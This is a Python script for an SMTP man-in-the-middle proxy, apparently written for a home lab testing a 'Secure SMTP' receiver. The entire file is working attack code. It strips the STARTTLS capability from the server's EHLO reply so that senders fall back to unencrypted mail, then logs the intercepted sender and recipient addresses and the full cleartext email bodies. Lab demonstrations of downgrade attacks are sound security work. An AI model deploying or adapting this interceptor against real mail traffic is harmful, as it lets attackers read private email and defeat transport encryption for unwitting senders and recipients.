#!/usr/bin/env python3
"""
Secure SMTP — Standalone Adversary / MitM Interceptor Proxy Node.

Designed to run on a 2nd device (Friend 1's Laptop) to act as a Man-in-the-Middle proxy:
  [Sender Device] -> [Attacker Proxy (Device 2)] -> [Secure SMTP Receiver (Your Mac)]

Zero external dependencies — runs on any laptop with standard Python 3.
"""

from __future__ import annotations

import argparse
import socket
import sys
import threading
import time

CYAN = "\033[96m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
BOLD = "\033[1m"
RESET = "\033[0m"


def print_banner(listen_port: int, target_host: str, target_port: int):
    print(f"\n{RED}{BOLD}╔════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{RED}{BOLD}║         SECURE SMTP — ADVERSARY / MitM PROXY NODE          ║{RESET}")
    print(f"{RED}{BOLD}║         Active STARTTLS Stripping & Eavesdrop Lab          ║{RESET}")
    print(f"{RED}{BOLD}╚════════════════════════════════════════════════════════════╝{RESET}")
    print(f"  {YELLOW}• Role:{RESET}         Adversary Network Interceptor (Device 2)")
    print(f"  {YELLOW}• Listening on:{RESET} 0.0.0.0:{listen_port}")
    print(f"  {YELLOW}• Forwarding to:{RESET} {target_host}:{target_port} (Secure SMTP Receiver)")
    print(f"  {YELLOW}• Attack mode:{RESET}  Strip STARTTLS capability from EHLO advertisements\n")


def handle_client_relay(
    client_sock: socket.socket,
    client_addr: tuple[str, int],
    target_host: str,
    target_port: int,
):
    print(f"{CYAN}[+] New connection intercepted from {client_addr[0]}:{client_addr[1]}{RESET}")

    try:
        server_sock = socket.create_connection((target_host, target_port), timeout=10)
    except Exception as e:
        print(f"{RED}[!] Failed to connect to receiver server {target_host}:{target_port}: {e}{RESET}")
        client_sock.close()
        return

    # Thread 1: Client -> Server
    def client_to_server():
        try:
            while True:
                data = client_sock.recv(4096)
                if not data:
                    break
                text = data.decode("utf-8", errors="ignore")
                
                # Check for sensitive intercepted commands
                if text.startswith("MAIL FROM:"):
                    print(f"  {YELLOW}[SNIFFED] Sender:{RESET} {text.strip()}")
                elif text.startswith("RCPT TO:"):
                    print(f"  {YELLOW}[SNIFFED] Recipient:{RESET} {text.strip()}")
                elif "DATA" in text and len(text) > 10:
                    print(f"  {RED}{BOLD}[INTERCEPTED CLEARTEXT EMAIL BODY]:{RESET}")
                    for line in text.strip().split("\r\n"):
                        print(f"    {RED}│ {line}{RESET}")

                server_sock.sendall(data)
        except Exception:
            pass
        finally:
            server_sock.close()
            client_sock.close()

    # Thread 2: Server -> Client (with STARTTLS Stripping)
    def server_to_client():
        try:
            while True:
                data = server_sock.recv(4096)
                if not data:
                    break
                text = data.decode("utf-8", errors="ignore")

                # Detect if server advertises STARTTLS capability
                if "STARTTLS" in text:
                    print(f"\n  {RED}{BOLD}⚡ [ATTACK DETECTED & EXECUTED]:{RESET}")
                    print(f"  {YELLOW}Original Server EHLO advertised STARTTLS!{RESET}")
                    
                    # Strip 250-STARTTLS or 250 STARTTLS
                    lines = text.split("\r\n")
                    tampered_lines = []
                    for line in lines:
                        if "STARTTLS" in line:
                            print(f"  {RED}[-] STRIPPING CAPABILITY LINE: '{line}'{RESET}")
                            continue
                        tampered_lines.append(line)

                    tampered_data = "\r\n".join(tampered_lines).encode("utf-8")
                    print(f"  {GREEN}[✓] Forwarded downgraded greeting to Sender (Forcing unencrypted fallback!){RESET}\n")
                    client_sock.sendall(tampered_data)
                else:
                    client_sock.sendall(data)
        except Exception:
            pass
        finally:
            client_sock.close()
            server_sock.close()

    t1 = threading.Thread(target=client_to_server, daemon=True)
    t2 = threading.Thread(target=server_to_client, daemon=True)
    t1.start()
    t2.start()


def main():
    parser = argparse.ArgumentParser(description="Secure SMTP MitM Interceptor Proxy")
    parser.add_argument("--listen", type=int, default=2525, help="Port to listen on (default: 2525)")
    parser.add_argument("--server", default="192.168.0.155", help="Target Secure SMTP Receiver IP (default: 192.168.0.155)")
    parser.add_argument("--server-port", type=int, default=2526, help="Target Receiver Port (default: 2526 - Modern TLS)")
    args = parser.parse_args()

    print_banner(args.listen, args.server, args.server_port)

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server.bind(("0.0.0.0", args.listen))
        server.listen(10)
        print(f"{GREEN}[✓] MitM Interceptor Proxy is active and listening on port {args.listen}...{RESET}")
        print(f"{CYAN}[*] Ready to intercept connections from Sender laptops.{RESET}\n")
    except Exception as e:
        print(f"{RED}[!] Failed to bind to port {args.listen}: {e}{RESET}")
        print(f"{YELLOW}[*] Hint: If port {args.listen} requires admin rights or is in use, try '--listen 8525'.{RESET}")
        sys.exit(1)

    try:
        while True:
            client_sock, client_addr = server.accept()
            handle_client_relay(client_sock, client_addr, args.server, args.server_port)
    except KeyboardInterrupt:
        print("\nStopping proxy.")
    finally:
        server.close()


if __name__ == "__main__":
    main()
